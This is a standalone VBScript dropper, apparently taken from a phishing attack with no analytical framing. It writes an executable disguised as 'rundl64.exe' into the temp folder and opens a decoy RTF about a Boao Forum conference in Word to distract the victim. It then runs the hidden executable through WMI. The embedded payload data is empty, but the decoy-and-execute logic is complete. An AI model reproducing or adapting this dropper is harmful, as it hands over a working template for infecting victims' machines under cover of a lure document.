Sub memchecker(FileName, Buf):Const adTypeBinary=1:Const adSaveCreateOverWrite=2:Dim stream, xmldom, node:Set xmldom=CreateObject("Microsoft.XMLDOM"):Set node=xmldom.CreateElement("binary"):node.DataType="bin.hex":node.Text="4d5a"+Buf:Set stream=CreateObject("ADODB.Stream"):stream.Type=adTypeBinary:stream.Open:stream.write node.NodeTypedValue:stream.saveToFile FileName, adSaveCreateOverWrite:stream.Close:Set stream=Nothing:Set node=Nothing:Set xmldom=Nothing:End Sub:Dim WshShell:Set WshShell=WScript.CreateObject("WScript.Shell"):tmppath=WshShell.ExpandEnvironmentStrings("%temp%")+"\rundl64.exe":memchecker tmppath, "":WriteData2="":Set xmldom1=CreateObject("MSXML2.DOMDocument"):Set stm1=xmldom1.createElement("stream"):stm1.dataType="bin.base64":stm1.text=WriteData2:Set stm2=CreateObject("Adodb.Stream"):stm2.Mode=3:stm2.Open():stm2.Type=1:Set fso=CreateObject("Scripting.FileSystemObject"):stm2.Write stm1.nodeTypedValue:path2=fso.GetSpecialFolder(2)+"\\Boao Forum for Asia Ulaanbaatar Conference Boosting Regional Development.rtf":stm2.SaveToFile path2, 2:Set oWord = CreateObject("Word.Application"):oWord.Visible = True:oWord.Documents.Open path2:set process=GetObject("winmgmts:Win32_Process"):result=process.Create(tmppath,null,null,processid)
